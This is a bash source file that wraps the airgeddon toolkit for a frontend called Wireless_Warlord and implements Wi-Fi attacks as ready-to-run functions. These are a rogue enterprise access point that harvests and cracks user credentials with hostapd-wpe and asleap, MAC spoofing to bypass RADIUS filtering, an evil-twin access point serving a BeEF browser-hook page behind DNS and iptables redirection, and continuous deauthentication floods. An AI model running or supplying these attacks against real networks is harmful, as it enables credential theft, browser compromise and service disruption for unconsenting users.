#!/usr/bin/env bash
#Title........: airgeddon.sh (Wireless_Warlord customized wrapper)
#Description..: This is a wrapper for airgeddon.sh for use with Wireless_Warlord
#Author.......: Wireless_Warlord (based on airgeddon by v1s1t0r)
#Version......: 1.0 (wrapper for airgeddon 11.41)
#Usage........: This file should not be executed directly

# This file serves as a wrapper around the original airgeddon.sh script
# It allows us to use airgeddon as a backend while presenting our own frontend
# Wireless_Warlord will source this file, not execute it directly

# =================================================================
# IMPORTANT NOTICE: This is a modified version of airgeddon.sh
# It is designed to be sourced by Wireless_Warlord, not executed directly
# All core functionality from the original airgeddon.sh is preserved
# Only the UI/interaction parts have been customized for Wireless_Warlord
# =================================================================

# If someone tries to execute this directly, abort and show instructions
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo "ERROR: This is a modified airgeddon wrapper file and should not be executed directly."
    echo "Please run the main Wireless_Warlord script instead: ./wireless_warlord.sh"
    exit 1
fi

# Store a reference to the original get_available_interfaces function
# so we can still call it from our own override
get_available_interfaces_prev() {
    # This will be replaced with airgeddon's function once it's sourced
    echo "wlan0"
}

# First, we'll define our custom functions that will override some of airgeddon's functions
# These will be our hooks into airgeddon's functionality

# Function to override airgeddon's main menu
ww_main_menu() {
    # This will be implemented in wireless_warlord.sh
    echo "Default ww_main_menu implementation"
}

# Function to override airgeddon's language selection
ww_language_menu() {
    # This will be implemented in wireless_warlord.sh
    echo "Default ww_language_menu implementation"
}

# Function to override airgeddon's interface selection
ww_select_interface() {
    # This will be implemented in wireless_warlord.sh
    echo "Default ww_select_interface implementation"
}

# Function to override airgeddon's exit handling
ww_handle_exit() {
    # This will be implemented in wireless_warlord.sh
    echo "Default ww_handle_exit implementation"
}

# Preserve any needed airgeddon variables and functions
preserve_airgeddon_vars() {
    # This function is a placeholder for saving any variables or function references
    # from the original airgeddon that we need to preserve after overriding
    return 0
}

# Now, create a dummy function for main_menu that will be replaced by airgeddon's version
# and then immediately overridden by our version
function main_menu() {
    # This will be replaced by airgeddon's version, then overridden
    return 0
}

# Function to initialize language strings after airgeddon is sourced
initialize_language_strings() {
    # Get the list of languages from airgeddon
    if declare -p lang_association &>/dev/null; then
        # Language strings loaded successfully
        return 0
    else
        # Failed to load language strings
        echo "ERROR: Failed to initialize language strings from airgeddon"
        return 1
    fi
}

# Now prepare to source the original airgeddon script
# We do this by temporarily saving the current PATH and any affected variables,
# then restoring them after sourcing

# Prepare to source the original airgeddon script
if [[ -f "${scriptfolder}airgeddon_original.sh" ]]; then
    # If we have a copy of the original, use it
    AIRGEDDON_ORIGINAL="${scriptfolder}airgeddon_original.sh"
else
    # Otherwise, look for airgeddon in the current directory
    AIRGEDDON_ORIGINAL="${scriptfolder}airgeddon.sh"
fi

# Check if airgeddon exists before trying to source it
if [[ ! -f "$AIRGEDDON_ORIGINAL" ]]; then
    echo "ERROR: Original airgeddon script not found at $AIRGEDDON_ORIGINAL"
    echo "Please ensure the original airgeddon.sh script is in the same directory as Wireless_Warlord"
    exit 1
fi

# The actual sourcing will be done in the wireless_warlord.sh script
# after our override functions are fully defined

# Define a function to actually source airgeddon once we're ready
source_airgeddon() {
    # This will source the original airgeddon script
    # and will be called by wireless_warlord.sh when ready
    source "$AIRGEDDON_ORIGINAL"
    
    # After sourcing, preserve any variables or functions we need
    preserve_airgeddon_vars
    
    # Initialize language strings
    initialize_language_strings
    
    return 0
}

# Define some utility functions that we'll use to interact with airgeddon's functions

# Function to get interface chipset (wraps airgeddon's function)
get_interface_chipset() {
    local interface="$1"
    local chipset=""
    
    # Call airgeddon's function if it exists
    if type -t set_chipset >/dev/null; then
        # Temporarily assign the interface variable that airgeddon expects
        local temp_interface="$interface"
        interface="$temp_interface"
        
        # Call airgeddon's function to set the chipset variable
        set_chipset
        
        # Get the result
        chipset="$chipset"
        
        # Restore original interface value
        interface="$temp_interface"
    else
        # Fallback if airgeddon's function isn't available
        chipset=$(lspci -k | grep -i -A 3 'network\|wireless' | grep -i -A 2 'wireless' | grep -v 'kernel driver' | sed '/^$/d' | tail -n 1)
        
        if [ -z "$chipset" ]; then
            chipset="Unknown"
        fi
    fi
    
    echo "$chipset"
}

# Function to check interface mode according to airgeddon's rules
check_interface_mode() {
    local interface="$1"
    
    # Call airgeddon's function if it exists
    if type -t check_interface_mode >/dev/null; then
        # Set variables that airgeddon expects
        local temp_interface="$interface"
        interface="$temp_interface"
        
        # Call the function
        check_interface_mode
        
        # Restore original value
        interface="$temp_interface"
    fi
    
    return 0
}

# Function to get enterprise hostile portal attack
enterprise_hostile_portal() {
    # This will be a wrapper for airgeddon's enterprise function
    
    # First, check if the required tools are available
    local missing_tools=""
    for tool in hostapd-wpe asleap; do
        if ! command -v $tool &> /dev/null; then
            missing_tools="$missing_tools $tool"
        fi
    done
    
    if [ -n "$missing_tools" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "❌ Missing Tools" \
            --msgbox "The following required tools are missing:$missing_tools\n\nPlease install them to continue." \
            10 60
        return
    fi
    
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    # Ask for ESSID to spoof
    exec 3>&1
    local target_essid=$(dialog \
        --clear \
        --backtitle "Wireless Warlord" \
        --title "🎯 Enterprise Attack" \
        --inputbox "Enter ESSID to impersonate:" \
        8 60 \
        "CorporateWifi" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        return
    fi
    
    # Create hostapd-wpe configuration
    local wpe_conf="${log_session_dir}/hostapd-wpe.conf"
    
    cat > "$wpe_conf" << EOF
interface=$interface
driver=nl80211
ssid=$target_essid
hw_mode=g
channel=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
auth_algs=3
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
EOF
    
    # Start hostapd-wpe
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🔐 Hostile Portal" \
        --msgbox "Starting Hostile Portal Enterprise Attack.\n\nESISD: $target_essid\n\nWait for users to connect...\n\nPress OK to launch attack." \
        12 60
    
    xterm -title "Wireless Warlord - Hostile Portal" -bg black -fg red -e "hostapd-wpe $wpe_conf | tee '$log_session_dir/hostapd-wpe.log'" &
    local wpe_pid=$!
    
    # Show log monitor in a separate window
    xterm -title "Wireless Warlord - Credentials Monitor" -bg black -fg green -geometry 100x15+0+400 -e "tail -f '$log_session_dir/hostapd-wpe.log' | grep -i 'password\|credentials\|username\|challenge\|response'" &
    local tail_pid=$!
    
    # Save PIDs for cleanup
    echo "$wpe_pid $tail_pid" > "$log_session_dir/enterprise_pids.txt"
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "✅ Hostile Portal Active" \
        --msgbox "Enterprise Hostile Portal is active.\n\nESISD: $target_essid\n\nLog file: $log_session_dir/hostapd-wpe.log\n\nPress OK to stop the attack." \
        12 60
    
    # Cleanup when user presses OK
    kill $(cat "$log_session_dir/enterprise_pids.txt") 2>/dev/null
    
    # Process the credentials with asleap if challenge/response pairs were captured
    if grep -q "challenge:" "$log_session_dir/hostapd-wpe.log" && grep -q "response:" "$log_session_dir/hostapd-wpe.log"; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "🔑 Process Credentials" \
            --yesno "Challenge-Response pairs captured.\n\nWould you like to attempt to crack the credentials using asleap?" \
            8 60
        
        if [ $? -eq 0 ]; then
            # Extract challenge/response pairs
            local challenge=$(grep -o -m 1 "challenge: [0-9a-f]\+" "$log_session_dir/hostapd-wpe.log" | cut -d' ' -f2)
            local response=$(grep -o -m 1 "response: [0-9a-f]\+" "$log_session_dir/hostapd-wpe.log" | cut -d' ' -f2)
            
            if [ -n "$challenge" ] && [ -n "$response" ]; then
                # Ask for wordlist
                exec 3>&1
                local wordlist=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord" \
                    --title "📚 Dictionary Selection" \
                    --inputbox "Enter path to wordlist:" \
                    8 60 \
                    "/usr/share/wordlists/rockyou.txt" \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                    xterm -title "Wireless Warlord - Credential Cracking" -bg black -fg green -e "asleap -C $challenge -R $response -W $wordlist | tee '$log_session_dir/asleap_results.txt'" &
                    
                    dialog --clear \
                        --backtitle "Wireless Warlord" \
                        --title "🔍 Credential Cracking" \
                        --msgbox "Cracking in progress. Please check the results window." \
                        8 50
                fi
            else
                dialog --clear \
                    --backtitle "Wireless Warlord" \
                    --title "❌ Error" \
                    --msgbox "Could not extract valid challenge/response pair from the log." \
                    8 50
            fi
        fi
    fi
    
    # Show any captured credentials
    if grep -q "username:" "$log_session_dir/hostapd-wpe.log"; then
        local credentials=$(grep -A 3 "username:" "$log_session_dir/hostapd-wpe.log")
        
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "🔑 Captured Credentials" \
            --msgbox "The following credentials were captured:\n\n$credentials" \
            15 70
    else
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "ℹ️ Information" \
            --msgbox "No credentials were captured during the attack." \
            8 40
    fi
}

# Function for RADIUS MAC Filter Bypass
enterprise_mac_bypass() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    # First scan for enterprise networks
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🔍 Enterprise Network Scan" \
        --msgbox "A new window will open to scan for enterprise networks.\n\nPress Ctrl+C in that window when you see your target network." \
        10 60
    
    xterm -title "Wireless Warlord - Enterprise Scan" -bg black -fg green -e "airodump-ng $interface" &
    local scan_pid=$!
    sleep 3
    
    # Ask for target info
    exec 3>&1
    local target_bssid=$(dialog \
        --clear \
        --backtitle "Wireless Warlord" \
        --title "🎯 Target Selection" \
        --inputbox "Enter BSSID of enterprise network:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $scan_pid 2>/dev/null
        return
    fi
    
    exec 3>&1
    local target_channel=$(dialog \
        --clear \
        --backtitle "Wireless Warlord" \
        --title "🎯 Target Selection" \
        --inputbox "Enter channel of enterprise network:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $scan_pid 2>/dev/null
        return
    fi
    
    exec 3>&1
    local target_essid=$(dialog \
        --clear \
        --backtitle "Wireless Warlord" \
        --title "🎯 Target Selection" \
        --inputbox "Enter ESSID of enterprise network:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $scan_pid 2>/dev/null
        return
    fi
    
    # Kill the scanning process
    kill $scan_pid 2>/dev/null
    
    # Now scan for valid MACs
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🔍 Client Scan" \
        --msgbox "A new window will open to scan for authorized clients.\n\nPress Ctrl+C in that window when you identify valid MACs." \
        10 60
    
    xterm -title "Wireless Warlord - Client Scan" -bg black -fg green -e "airodump-ng $interface --bssid $target_bssid -c $target_channel" &
    local client_scan_pid=$!
    sleep 3
    
    exec 3>&1
    local valid_mac=$(dialog \
        --clear \
        --backtitle "Wireless Warlord" \
        --title "🎯 MAC Selection" \
        --inputbox "Enter MAC of an authorized client:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $client_scan_pid 2>/dev/null
        return
    fi
    
    kill $client_scan_pid 2>/dev/null
    
    # Change MAC address
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "📱 MAC Spoofing" \
        --msgbox "Will now change your MAC address to: $valid_mac" \
        8 50
    
    ifconfig $interface down
    macchanger -m $valid_mac $interface | dialog --programbox "Changing MAC address..." 15 70
    ifconfig $interface up
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "✅ MAC Changed" \
        --msgbox "Your MAC address has been changed to a valid client MAC.\n\nYou can now connect to the enterprise network using the normal connection process in your network manager." \
        10 60
}

# Function for Enterprise Network Scan
enterprise_scan() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local interface_mode=$(get_interface_mode "$interface")
    if [ "$interface_mode" != "monitor" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "⚠️ Wrong Interface Mode" \
            --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
            8 60
            
        if [ $? -eq 0 ]; then
            exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
            local new_interface=$(get_monitor_mode_interface "$interface")
            if [ -n "$new_interface" ]; then
                interface=$new_interface
                current_interface="($interface)"
            else
                dialog --clear \
                    --backtitle "Wireless Warlord" \
                    --title "❌ Error" \
                    --msgbox "Failed to enable monitor mode." \
                    8 40
                return
            fi
        else
            return
        fi
    fi
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🏢 Enterprise Network Scan" \
        --msgbox "A new window will open to scan for enterprise networks.\n\nEnterprise networks typically use WPA/WPA2 Enterprise authentication." \
        10 60
    
    xterm -title "Wireless Warlord - Enterprise Scan" -bg black -fg green -e "airodump-ng $interface | grep -i 'MGT'" &
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "ℹ️ Information" \
        --msgbox "Enterprise networks are indicated by:\n- 'MGT' authentication (802.1x)\n- WPA/WPA2 Enterprise security\n\nPress Ctrl+C in the scan window when done." \
        12 60
}

# Function to perform Evil Twin attack with BeEF
evil_twin_beef() {
    local essid="$1"
    local channel="$2"
    local bssid="$3"
    
    # Check if required tools are available
    local missing_tools=""
    for tool in hostapd dnsmasq iptables beef-xss lighttpd; do
        if ! command -v $tool &> /dev/null && ! command -v beef &> /dev/null; then
            missing_tools="$missing_tools $tool"
        fi
    done
    
    if [ -n "$missing_tools" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "❌ Missing Tools" \
            --msgbox "The following required tools are missing:$missing_tools\n\nPlease install them to continue." \
            10 60
        return
    fi
    
    # Find BeEF path
    local beef_path=""
    for path in /usr/share/beef-xss /usr/share/beef /opt/beef /opt/beef-project /usr/lib/beef; do
        if [ -d "$path" ]; then
            beef_path="$path"
            break
        fi
    done
    
    if [ -z "$beef_path" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "❌ BeEF Not Found" \
            --msgbox "Could not locate BeEF installation directory.\nPlease install BeEF or specify its location." \
            8 60
        return
    fi
    
    # Create hostapd configuration file
    cat > "$log_session_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF
    
    # Create dnsmasq configuration file
    cat > "$log_session_dir/dnsmasq.conf" << EOF
interface=$interface
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
EOF
    
    # Create lighttpd configuration file
    mkdir -p "$log_session_dir/www"
    cat > "$log_session_dir/lighttpd.conf" << EOF
server.document-root = "$log_session_dir/www"
server.port = 80
server.bind = "192.168.1.1"
server.errorlog = "$log_session_dir/lighttpd-error.log"
server.modules = (
    "mod_access",
    "mod_accesslog",
    "mod_redirect"
)
accesslog.filename = "$log_session_dir/lighttpd-access.log"
index-file.names = ( "index.html" )

# Redirect everything to the hook page
\$HTTP["host"] =~ ".*" {
    url.redirect = ( "^(.*)$" => "http://192.168.1.1/index.html" )
}
EOF
    
    # Create BeEF config file
    cat > "$log_session_dir/beef.conf" << EOF
beef:
    http:
        host: "127.0.0.1"
        port: "3000"
        https: false
    credentials:
        user: "beef"
        passwd: "beef"
    database:
        driver: "sqlite"
        db: "beef.db"
    dns:
        host: "127.0.0.1"
        port: "53"
        ttl: "60"
EOF
    
    # Create hook page
    cat > "$log_session_dir/www/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$essid - Network Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="http://127.0.0.1:3000/hook.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            padding: 30px;
            width: 360px;
            max-width: 90%;
        }
        h1 {
            color: #333;
            margin-top: 0;
            font-size: 24px;
            text-align: center;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo span {
            font-size: 40px;
        }
        .loading {
            text-align: center;
            margin-top: 20px;
        }
        .loading span {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #0078D7;
            margin: 0 5px;
            animation: loading 1.5s infinite;
        }
        .loading span:nth-child(2) {
            animation-delay: 0.2s;
        }
        .loading span:nth-child(3) {
            animation-delay: 0.4s;
        }
        @keyframes loading {
            0%, 100% { transform: scale(0.5); opacity: 0.5; }
            50% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>📶</span>
        </div>
        <h1>Welcome to $essid Network</h1>
        <p>You are now connected to the network. Please wait while we verify your connection...</p>
        
        <div class="loading">
            <span></span>
            <span></span>
            <span></span>
        </div>
    </div>
</body>
</html>
EOF
    
    # Set up network configuration
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🌐 Setting Up Network" \
        --infobox "Configuring network for BeEF attack..." \
        5 60
    
    # Configure interface
    ifconfig $interface up 192.168.1.1 netmask 255.255.255.0
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Set up iptables for redirection
    iptables -t nat -F
    iptables -F
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
    
    # Start BeEF
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🐂 Starting BeEF" \
        --infobox "Launching BeEF exploitation framework..." \
        5 60
    
    # Check if we should use beef or beef-xss command
    if command -v beef-xss &> /dev/null; then
        xterm -title "Wireless Warlord - BeEF" -bg black -fg red -geometry 100x25+0+0 -e "cd $beef_path && beef-xss -c '$log_session_dir/beef.conf'" &
    else
        xterm -title "Wireless Warlord - BeEF" -bg black -fg red -geometry 100x25+0+0 -e "cd $beef_path && ./beef -c '$log_session_dir/beef.conf'" &
    fi
    local beef_pid=$!
    
    sleep 5
    
    # Start hostapd, dnsmasq, and lighttpd
    xterm -title "Wireless Warlord - AP (hostapd)" -bg black -fg green -geometry 100x25+500+0 -e "hostapd '$log_session_dir/hostapd.conf'" &
    local hostapd_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - DHCP (dnsmasq)" -bg black -fg yellow -geometry 100x25+0+300 -e "dnsmasq -C '$log_session_dir/dnsmasq.conf' -d" &
    local dnsmasq_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - Web Server (lighttpd)" -bg black -fg cyan -geometry 100x25+500+300 -e "lighttpd -D -f '$log_session_dir/lighttpd.conf'" &
    local lighttpd_pid=$!
    
    # Deauthentication attack to force clients to connect to our AP
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "💣 Deauthentication Attack" \
        --yesno "Would you like to start a deauthentication attack to force clients to connect to your Evil Twin?" \
        8 60
    
    if [ $? -eq 0 ]; then
        xterm -title "Wireless Warlord - Deauth Attack" -bg black -fg red -geometry 100x15+500+500 -e "aireplay-ng --deauth 0 -a $bssid $interface" &
        local deauth_pid=$!
        echo "$deauth_pid" >> "$log_session_dir/et_process_pids.txt"
    fi
    
    # Save PIDs for cleanup
    echo "$beef_pid $hostapd_pid $dnsmasq_pid $lighttpd_pid" > "$log_session_dir/et_process_pids.txt"
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "✅ BeEF Hook Active" \
        --msgbox "Evil Twin with BeEF hook is now active.\n\nESSID: $essid\nIP: 192.168.1.1\nChannel: $channel\n\nBeEF Control Panel: http://127.0.0.1:3000/ui/panel\nUser: beef\nPassword: beef\n\nPress OK to stop the attack." \
        15 60
    
    # Cleanup when user presses OK
    kill $(cat "$log_session_dir/et_process_pids.txt") 2>/dev/null
    ifconfig $interface down
    iptables -t nat -F
    iptables -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🛑 Attack Stopped" \
        --msgbox "Evil Twin BeEF attack has been stopped.\n\nAll logs saved in: $log_session_dir" \
        8 60
}

# Function to perform Evil Twin with MITM attack
evil_twin_enterprise() {
    local essid="$1"
    local channel="$2"
    
    # Check if required tools are available
    local missing_tools=""
    for tool in hostapd-wpe dnsmasq iptables; do
        if ! command -v $tool &> /dev/null; then
            missing_tools="$missing_tools $tool"
        fi
    done
    
    if [ -n "$missing_tools" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "❌ Missing Tools" \
            --msgbox "The following required tools are missing:$missing_tools\n\nPlease install them to continue." \
            10 60
        return
    fi
    
    # Create hostapd-wpe configuration file
    cat > "$log_session_dir/hostapd-wpe.conf" << EOF
interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
auth_algs=3
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
EOF
    
    # Create dnsmasq configuration file
    cat > "$log_session_dir/dnsmasq.conf" << EOF
interface=$interface
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
EOF
    
    # Set up network configuration
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🌐 Setting Up Network" \
        --infobox "Configuring network for Enterprise Evil Twin attack..." \
        5 60
    
    # Configure interface
    ifconfig $interface up 192.168.1.1 netmask 255.255.255.0
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Set up iptables for forwarding
    iptables -t nat -F
    iptables -F
    iptables -t nat -A POSTROUTING -o $(get_internet_interface) -j MASQUERADE
    iptables -A FORWARD -i $interface -j ACCEPT
    
    # Start hostapd-wpe and dnsmasq
    xterm -title "Wireless Warlord - Enterprise AP" -bg black -fg green -geometry 100x25+0+0 -e "hostapd-wpe '$log_session_dir/hostapd-wpe.conf' | tee '$log_session_dir/hostapd-wpe.log'" &
    local hostapd_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - DHCP (dnsmasq)" -bg black -fg yellow -geometry 100x25+0+300 -e "dnsmasq -C '$log_session_dir/dnsmasq.conf' -d" &
    local dnsmasq_pid=$!
    
    # Monitor for captured credentials
    xterm -title "Wireless Warlord - Credentials Monitor" -bg black -fg green -geometry 100x15+500+0 -e "tail -f '$log_session_dir/hostapd-wpe.log' | grep -i 'username\|password\|challenge\|response'" &
    local tail_pid=$!
    
    # Save PIDs for cleanup
    echo "$hostapd_pid $dnsmasq_pid $tail_pid" > "$log_session_dir/et_process_pids.txt"
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "✅ Enterprise Evil Twin Active" \
        --msgbox "Enterprise Evil Twin is now active.\n\nESSID: $essid\nIP: 192.168.1.1\nChannel: $channel\n\nLog file: $log_session_dir/hostapd-wpe.log\n\nPress OK to stop the attack." \
        12 60
    
    # Cleanup when user presses OK
    kill $(cat "$log_session_dir/et_process_pids.txt") 2>/dev/null
    ifconfig $interface down
    iptables -t nat -F
    iptables -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Show captured credentials if any
    if grep -q "username:" "$log_session_dir/hostapd-wpe.log"; then
        local credentials=$(grep -A 3 "username:" "$log_session_dir/hostapd-wpe.log")
        
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "🔑 Captured Credentials" \
            --msgbox "The following credentials were captured:\n\n$credentials" \
            15 70
    else
        dialog --clear \
            --backtitle "Wireless Warlord" \
            --title "ℹ️ Information" \
            --msgbox "No credentials were captured during the attack." \
            8 40
    fi
    
    dialog --clear \
        --backtitle "Wireless Warlord" \
        --title "🛑 Attack Stopped" \
        --msgbox "Enterprise Evil Twin attack has been stopped.\n\nAll logs saved in: $log_session_dir" \
        8 60
}
